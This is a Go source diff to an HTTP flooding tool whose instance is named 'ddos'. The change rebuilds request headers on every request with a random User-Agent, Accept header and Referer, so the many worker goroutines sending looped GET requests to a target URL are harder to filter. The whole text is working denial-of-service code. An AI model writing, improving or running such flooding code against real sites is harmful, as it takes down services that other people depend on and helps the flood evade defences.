@@ -16,13 +16,7 @@ import (
 
 func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
 	ddos := &flooder{
-		url: url,
-		header: []string{
-			"Connection: Keep-Alive, Cache-Control: max-age=0",
-			"User-Agent: " + getUserAgent(),
-			acceptall[rand.Intn(len(acceptall))],
-			referers[rand.Intn(len(referers))],
-		},
+		url:          url,
 		workerAmount: workerAmount,
 		client:       http.DefaultClient,
 		stopSignal:   make(chan bool),
@@ -42,7 +36,6 @@ type Flooder interface {
 
 type flooder struct {
 	url          string
-	header       []string
 	client       *http.Client
 	workerAmount uint16
 	stopSignal   chan bool
@@ -53,14 +46,12 @@ type flooder struct {
 }
 
 func (f *flooder) Flood() {
-	defaultRequest := f.configRequest()
-
 	for idx := uint16(0); idx < f.workerAmount; idx++ {
 		time.Sleep(time.Microsecond * 100)
 		f.wg.Add(1)
 		go func() {
 			defer f.wg.Done()
-			f.flood(defaultRequest)
+			f.flood()
 		}()
 		fmt.Printf("\rThreads [%.0f] are ready", float64(idx+1))
 		os.Stdout.Sync()
@@ -86,29 +77,14 @@ func (f *flooder) Flood() {
 	f.timer.Stop()
 }
 
-func (f *flooder) configRequest() *http.Request {
-	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	for _, header := range f.header {
-		splitedHeader := strings.SplitN(header, ":", 2)
-		if len(splitedHeader) == 2 {
-			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
-		}
-	}
-
-	return defaultRequest
-}
-
-func (f *flooder) flood(request *http.Request) {
+func (f *flooder) flood() {
 	for {
 		select {
 		case <-f.stopSignal:
 			return
 		default:
 			<-f.startSignal
+			request := f.configRequest()
 
 			resp, err := f.client.Do(request)
 			if err == nil {
@@ -123,6 +99,29 @@ func (f *flooder) flood(request *http.Request) {
 		}
 		runtime.Gosched()
 	}
+}
+
+func (f *flooder) configRequest() *http.Request {
+	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	header := []string{
+		"Connection: Keep-Alive, Cache-Control: max-age=0",
+		"User-Agent: " + getUserAgent(),
+		acceptall[rand.Intn(len(acceptall))],
+		referers[rand.Intn(len(referers))],
+	}
+
+	for _, header := range header {
+		splitedHeader := strings.SplitN(header, ":", 2)
+		if len(splitedHeader) == 2 {
+			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
+		}
+	}
+
+	return defaultRequest
 }
 
 func (f *flooder) Stop() {
